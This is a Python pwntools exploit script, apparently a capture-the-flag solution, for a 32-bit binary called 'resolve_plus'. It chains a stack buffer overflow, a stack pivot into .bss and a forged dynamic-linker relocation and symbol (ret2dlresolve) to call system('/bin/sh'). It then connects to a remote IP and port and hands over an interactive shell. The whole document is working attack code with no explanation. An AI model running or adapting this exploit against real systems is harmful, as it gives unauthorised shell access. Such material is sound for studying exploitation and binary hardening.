#! /usr/bin/env python3

from pwn import *

link = "./resolve_plus"
base = 0
size_buffer = 0x3A
elf = ELF(link)
rop = ROP(elf)
leave_ret = base + (rop.find_gadget(['leave', 'ret']))[0]
addr_plt = base + elf.get_section_by_name('.plt').header['sh_addr']
addr_got = base + elf.get_section_by_name('.got.plt').header['sh_addr']
bss = ((base + elf.get_section_by_name('.bss').header['sh_addr']) & 0xfffff000) + 0xf00
#print(elf.plt['read'])
read_plt = base + elf.plt['read']
SYMTAB = base + elf.get_section_by_name('.dynsym').header['sh_addr']
STRTAB = base + elf.get_section_by_name('.dynstr').header['sh_addr']
JMPREL = base + elf.get_section_by_name('.rel.plt').header['sh_addr']
dl_resolv = addr_plt

# read to .bss and esp = bss
payload = b"A"*size_buffer
payload += p32(bss)
payload += (p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss) + p32(100))

# leak resolv address:
area = bss + 20
rel_offset = area - JMPREL
bin_sh = bss + 100 - 8

# override .bss:
payload2 = b"bbbb" #fake ebp
payload2 += p32(dl_resolv)
payload2 += p32(rel_offset)
payload2 += b"cccc" #fake return address
payload2 += p32(bin_sh)

# build elf32_ref struct:
sym_address = area + 8
sym_pad = 0x10 - ((sym_address - SYMTAB) % 0x10)
sym_address += sym_pad
sym_index = (sym_address - SYMTAB) // 0x10

elf32_rel_info = (sym_index<<8) | 7

#*****
payload3 = p32(addr_got+0xc)
payload3 += p32(elf32_rel_info)
payload3 += sym_pad*b"a"

# build elf32_sym struct
st_name = sym_address + 0x10 - STRTAB

payload3 += p32(st_name)
payload3 += p32(0)
payload3 += p32(0)
payload3 += p32(0x12)

payload3 += b"system\x00"
tmp = len(payload2+payload3)
payload3 += b"SHELL=/bin/bash\x00"
pad = 100 - 8 - len(payload2) - len(payload3)
print("Padding :{}".format(pad))
payload3 += pad*b"a"
payload3 += b"/bin/sh\x00"

#shellcode = payload+ payload2+ payload3

#exploit 
#p = process(elf.path)
#gdb.attach(p, gdbscript='''
#init-gef\n
#''')
p = remote("103.81.86.241",1338)
#p.recvuntil("answer: ")
payload += (270-len(payload))*b"A"
payload += p32(bss+tmp)
p.send(payload+(274-len(payload))*b"A" + payload2 + payload3)
p.interactive()

